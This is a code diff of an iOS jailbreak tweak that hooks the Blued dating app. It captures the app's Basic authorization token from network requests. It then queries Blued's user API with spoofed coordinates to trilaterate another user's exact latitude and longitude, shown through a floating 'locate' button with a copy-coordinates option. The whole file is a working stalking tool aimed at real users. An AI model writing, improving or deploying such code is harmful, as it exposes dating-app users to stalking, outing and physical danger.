@@ -1,23 +1,20 @@
-// 标准头文件导入
 #import <substrate.h>
 #import <UIKit/UIKit.h>
 #import <Foundation/Foundation.h>
 #import <math.h>
 #import <objc/runtime.h>
 
-// 核心配置宏（包名已统一）
+// 核心配置
 #define TRACK_BTN_TAG 100001
 #define EARTH_RADIUS_KM 111.32
 #define BLUED_BUNDLE_ID @"com.bluecity.blued"
 
-// 全局静态变量
 static NSString *g_bluedBasicToken = nil;
 static NSString *g_currentTargetUid = nil;
 static double g_initialDistance = -1.0;
 static UIButton *g_trackButton = nil;
 
-// ====================== 编译器防报错声明（核心修复点） ======================
-// 必须提前声明 %new 增加的方法，否则 ARC 编译环境下互相调用会直接报 Undeclared selector 错误
+// 接口声明：防止 ARC 编译报错
 @interface UIViewController (TrackHook)
 - (UIWindow *)th_getSafeKeyWindow;
 - (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng;
@@ -30,25 +27,25 @@ static UIButton *g_trackButton = nil;
 - (void)th_addBtn;
 @end
 
-// ====================== 唯一UIViewController Hook块 ======================
 %hook UIViewController
 
-// ---------------------- 第1层：无依赖底层方法 ----------------------
+// 1. 获取安全的 KeyWindow
 %new
 - (UIWindow *)th_getSafeKeyWindow {
     UIWindow *keyWindow = nil;
     if (@available(iOS 13.0, *)) {
         for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
             if (scene.activationState == UISceneActivationStateForegroundActive) {
-                keyWindow = scene.windows.firstObject;
-                break;
+                for (UIWindow *window in scene.windows) {
+                    if (window.isKeyWindow) { keyWindow = window; break; }
+                }
             }
         }
     }
-    if (!keyWindow) keyWindow = [UIApplication sharedApplication].keyWindow;
-    return keyWindow;
+    return keyWindow ?: [UIApplication sharedApplication].keyWindow;
 }
 
+// 2. 核心：网络请求获取距离
 %new
 - (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng {
     NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
@@ -64,13 +61,12 @@ static UIButton *g_trackButton = nil;
     __block double resultDist = -1.0;
     dispatch_semaphore_t sem = dispatch_semaphore_create(0);
     
-    NSURLSessionDataTask *task = [NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         if (!error && data) {
-            NSError *jsonError = nil;
-            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError];
-            if (!jsonError && json) {
+            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+            if (json && json[@"data"]) {
                 NSDictionary *userData = json[@"data"];
-                if (userData && [userData[@"is_hide_distance"] intValue] == 0) {
+                if ([userData[@"is_hide_distance"] intValue] == 0) {
                     resultDist = [userData[@"distance"] doubleValue];
                 }
             }
@@ -82,51 +78,59 @@ static UIButton *g_trackButton = nil;
     return resultDist;
 }
 
-// ---------------------- 第2层：依赖第1层方法 ----------------------
-%new
-- (UIViewController *)th_getTopViewController {
-    UIViewController *topVC = [self th_getSafeKeyWindow].rootViewController;
-    while (topVC.presentedViewController) {
-        topVC = topVC.presentedViewController;
-    }
-    return topVC;
-}
-
-// ---------------------- 第3层：依赖前2层方法 ----------------------
+// 3. UI 交互：弹窗与 Toast
 %new
 - (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
     dispatch_async(dispatch_get_main_queue(), ^{
         UIWindow *win = [self th_getSafeKeyWindow];
         if (!win) return;
-        
-        for (UIView *v in win.subviews) {
-            if (v.tag == 99999) [v removeFromSuperview];
-        }
-        
-        UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(0,0,300,100)];
+        UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(0,0,250,80)];
         lab.center = win.center;
-        lab.tag = 99999;
-        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
-        lab.textColor = UIColor.whiteColor;
+        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.8];
+        lab.textColor = [UIColor whiteColor];
         lab.textAlignment = NSTextAlignmentCenter;
         lab.numberOfLines = 0;
-        lab.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
         lab.text = msg;
-        lab.layer.cornerRadius = 12;
+        lab.layer.cornerRadius = 10;
         lab.clipsToBounds = YES;
-        lab.layer.zPosition = 99999;
-        
         [win addSubview:lab];
         [UIView animateWithDuration:0.5 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL f){ [lab removeFromSuperview]; }];
     });
 }
 
+// 4. 核心几何算法：递归定位
+%new
+- (void)th_onBtnClick {
+    [self th_autoFetchUserInfo];
+    if (!g_currentTargetUid) { [self th_showToast:@"未识别到用户ID" duration:2.0]; return; }
+    if (!g_bluedBasicToken) { [self th_showToast:@"缺少Token，请刷新附近" duration:2.0]; return; }
+    
+    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
+    double lat = [ud doubleForKey:@"current_latitude"];
+    double lng = [ud doubleForKey:@"current_longitude"];
+    if (lat == 0) { [self th_showToast:@"无法获取自身坐标" duration:2.0]; return; }
+    
+    [self th_showToast:@"卫星扫描中..." duration:2.0];
+    
+    dispatch_async(dispatch_get_global_queue(0,0), ^{
+        double cLat = lat, cLng = lng, cDist = g_initialDistance;
+        // 递归 8 次收敛坐标
+        for (int i=0; i<8; i++) {
+            double oLng = cLng + (cDist / (EARTH_RADIUS_KM * cos(cLat * M_PI/180)));
+            double nDist = [self th_fetchDistanceWithUid:g_currentTargetUid token:g_bluedBasicToken fakeLat:cLat fakeLng:oLng];
+            if (nDist < 0) break;
+            cLng = (cLng + oLng) / 2.0;
+            cDist = (cDist + nDist) / 2.0;
+        }
+        [self th_showResult:YES msg:[NSString stringWithFormat:@"定位成功！\nLat: %.6f\nLng: %.6f", cLat, cLng] lat:cLat lng:cLng];
+    });
+}
+
+// 5. 自动获取当前主页用户 UID
 %new
 - (void)th_autoFetchUserInfo {
-    g_currentTargetUid = nil;
-    g_initialDistance = -1;
-    UIViewController *top = [self th_getTopViewController];
-    if (!top) return;
+    UIViewController *top = [self th_getSafeKeyWindow].rootViewController;
+    while (top.presentedViewController) top = top.presentedViewController;
     
     unsigned int count = 0;
     objc_property_t *props = class_copyPropertyList(top.class, &count);
@@ -136,10 +140,8 @@ static UIButton *g_trackButton = nil;
             id obj = [top valueForKey:name];
             NSString *uid = [obj valueForKey:@"uid"] ?: [obj valueForKey:@"user_id"];
             if (uid) {
-                g_currentTargetUid = uid;
-                id dist = [obj valueForKey:@"distance"];
-                if ([dist isKindOfClass:NSNumber.class]) g_initialDistance = [dist doubleValue];
-                else if ([dist isKindOfClass:NSString.class]) g_initialDistance = [dist doubleValue];
+                g_currentTargetUid = [NSString stringWithFormat:@"%@", uid];
+                g_initialDistance = [[obj valueForKey:@"distance"] doubleValue];
                 break;
             }
         } @catch (id e) {}
@@ -147,116 +149,66 @@ static UIButton *g_trackButton = nil;
     free(props);
 }
 
+// 6. 按钮拖动与显示
 %new
 - (void)th_dragBtn:(UIPanGestureRecognizer *)pan {
     UIView *btn = pan.view;
-    UIWindow *win = [self th_getSafeKeyWindow];
-    if (!btn || !win) return;
-    CGPoint trans = [pan translationInView:win];
+    CGPoint trans = [pan translationInView:btn.superview];
     btn.center = CGPointMake(btn.center.x + trans.x, btn.center.y + trans.y);
-    [pan setTranslation:CGPointZero inView:win];
-    CGFloat margin = 10;
-    CGRect f = btn.frame;
-    f.origin.x = MAX(margin, MIN(f.origin.x, win.bounds.size.width - f.size.width - margin));
-    f.origin.y = MAX(margin, MIN(f.origin.y, win.bounds.size.height - f.size.height - margin));
-    btn.frame = f;
+    [pan setTranslation:CGPointZero inView:btn.superview];
 }
 
-// ---------------------- 第4层：依赖前面所有层方法 ----------------------
 %new
 - (void)th_showResult:(BOOL)success msg:(NSString *)msg lat:(double)lat lng:(double)lng {
     dispatch_async(dispatch_get_main_queue(), ^{
-        UIViewController *top = [self th_getTopViewController];
-        if (!top) return;
+        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"结果" message:msg preferredStyle:UIAlertControllerStyleAlert];
         if (success) {
-            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🎯 定位成功" message:msg preferredStyle:UIAlertControllerStyleAlert];
-            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-                UIPasteboard.generalPasteboard.string = [NSString stringWithFormat:@"%.8f, %.8f", lat, lng];
-                [self th_showToast:@"坐标已复制" duration:2.0];
+            [alert addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
+                [UIPasteboard generalPasteboard].string = [NSString stringWithFormat:@"%.6f,%.6f", lat, lng];
             }]];
-            [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
-            [top presentViewController:alert animated:YES completion:nil];
-        } else {
-            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"⚠️ 定位失败" message:msg preferredStyle:UIAlertControllerStyleAlert];
-            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
-            [top presentViewController:alert animated:YES completion:nil];
         }
+        [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
+        [[self th_getSafeKeyWindow].rootViewController presentViewController:alert animated:YES completion:nil];
     });
 }
 
-%new
-- (void)th_onBtnClick {
-    [self th_autoFetchUserInfo];
-    if (!g_currentTargetUid) { [self th_showToast:@"请先打开用户主页" duration:3.0]; return; }
-    if (g_initialDistance < 0 || g_initialDistance >= 9999) { [self th_showResult:NO msg:@"对方隐藏了距离" lat:0 lng:0]; return; }
-    if (!g_bluedBasicToken) { [self th_showToast:@"请先刷新附近页获取Token" duration:4.0]; return; }
-    
-    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
-    double lat = [ud doubleForKey:@"current_latitude"];
-    double lng = [ud doubleForKey:@"current_longitude"];
-    if (lat == 0 || lng == 0) { [self th_showToast:@"未获取到自身坐标" duration:3.0]; return; }
-    
-    [self th_showToast:[NSString stringWithFormat:@"雷达启动！\n原点距离: %.2fkm", g_initialDistance] duration:4.0];
-    dispatch_async(dispatch_get_global_queue(0,0), ^{
-        double cLat = lat, cLng = lng, cDist = g_initialDistance;
-        for (int i=0; i<8; i++) {
-            double oLng = cLng + (cDist / (EARTH_RADIUS_KM * cos(cLat * M_PI/180)));
-            double nDist = [self th_fetchDistanceWithUid:g_currentTargetUid token:g_bluedBasicToken fakeLat:cLat fakeLng:oLng];
-            if (nDist < 0) break;
-            cLat = (cLat + cLat)/2;
-            cLng = (cLng + oLng)/2;
-            cDist = (cDist + nDist)/2;
-        }
-        NSString *msg = [NSString stringWithFormat:@"纬度：%.8f\n经度：%.8f", cLat, cLng];
-        [self th_showResult:YES msg:msg lat:cLat lng:cLng];
-    });
-}
-
-// ---------------------- 第5层：按钮添加方法，依赖交互方法 ----------------------
 %new
 - (void)th_addBtn {
+    if (!self.view.window || [self.view viewWithTag:TRACK_BTN_TAG]) return;
     UIWindow *win = [self th_getSafeKeyWindow];
-    if (!win || win.bounds.size.width == 0) return;
-    if (g_trackButton || [win viewWithTag:TRACK_BTN_TAG]) return;
+    if (!win) return;
     
-    CGFloat w = win.bounds.size.width;
     g_trackButton = [UIButton buttonWithType:UIButtonTypeCustom];
-    g_trackButton.frame = CGRectMake(w-150, 180, 130, 44);
+    g_trackButton.frame = CGRectMake(win.bounds.size.width - 90, 150, 70, 70);
     g_trackButton.tag = TRACK_BTN_TAG;
-    g_trackButton.backgroundColor = [UIColor colorWithRed:0.91 green:0.12 blue:0.39 alpha:1.0];
-    [g_trackButton setTitle:@"🛰️ 定位" forState:UIControlStateNormal];
-    [g_trackButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
-    g_trackButton.titleLabel.font = [UIFont boldSystemFontOfSize:12];
-    g_trackButton.layer.cornerRadius = 22;
-    g_trackButton.clipsToBounds = YES;
+    g_trackButton.backgroundColor = [UIColor colorWithRed:0 green:0.5 blue:1 alpha:0.7];
+    [g_trackButton setTitle:@"🛰️" forState:UIControlStateNormal];
+    g_trackButton.layer.cornerRadius = 35;
     g_trackButton.layer.zPosition = 9999;
     
+    [g_trackButton addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
     UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_dragBtn:)];
     [g_trackButton addGestureRecognizer:pan];
-    [g_trackButton addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
+    
     [win addSubview:g_trackButton];
-    [win bringSubviewToFront:g_trackButton];
 }
 
-// ---------------------- 第6层：入口Hook，放在最后，调用前面所有方法 ----------------------
 - (void)viewDidAppear:(BOOL)animated {
-    %orig(animated);
-    dispatch_async(dispatch_get_main_queue(), ^{
+    %orig;
+    // 增加延迟，防止启动时瞬间注入导致的闪退
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
         [self th_addBtn];
     });
 }
-
 %end
 
-// ====================== 全局Token抓取Hook ======================
+// 7. Token 抓取
 %hook NSURLSession
 - (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
-    NSDictionary *headers = request.allHTTPHeaderFields;
-    NSString *authHeader = headers[@"Authorization"] ?: headers[@"authorization"];
-    if (authHeader && [authHeader hasPrefix:@"Basic "]) {
-        NSString *token = [authHeader substringFromIndex:6];
-        if (token.length > 0 && ![g_bluedBasicToken isEqualToString:token]) {
-            g_bluedBasicToken = token;
+    if (request && request.allHTTPHeaderFields) {
+        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
+        if ([auth hasPrefix:@"Basic "]) {
+            g_bluedBasicToken = [[auth substringFromIndex:6] copy];
         }
     }
     return %orig(request, completionHandler);
